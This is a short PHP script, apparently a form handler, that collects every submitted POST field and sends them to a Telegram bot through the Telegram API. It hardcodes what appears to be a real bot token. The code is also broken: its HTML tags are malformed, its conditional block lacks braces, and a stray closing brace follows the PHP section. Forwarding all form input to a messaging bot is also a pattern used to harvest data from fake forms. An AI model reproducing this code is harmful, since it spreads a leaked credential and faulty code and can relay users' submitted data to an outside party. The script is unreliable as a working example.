<?php
$content = '';
foreach ($_POST as $key => $value) {
    if($value){
        $content .="<b>$key</b.: <i>$value</i>\n";
    }
}
if(trim($content))
    $content = "<b>Message from Site:</b.\n".$content;
    // your bots'token that got from @Botfather
    $apiToken = '7065804012:AAF6zsRTVNpV1NB8JS0-9R8k56vY5947lhc';
    $data = [
        //The user's (thatyou want to send a message) telegram chat id
        'chat_id' => '@InnovativeofficeBot',
        'text' => $content,
        'parse_mode' => 'HTML'
    ];
    $response = file_get_contents( filename:"https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));
 

?>


    
}
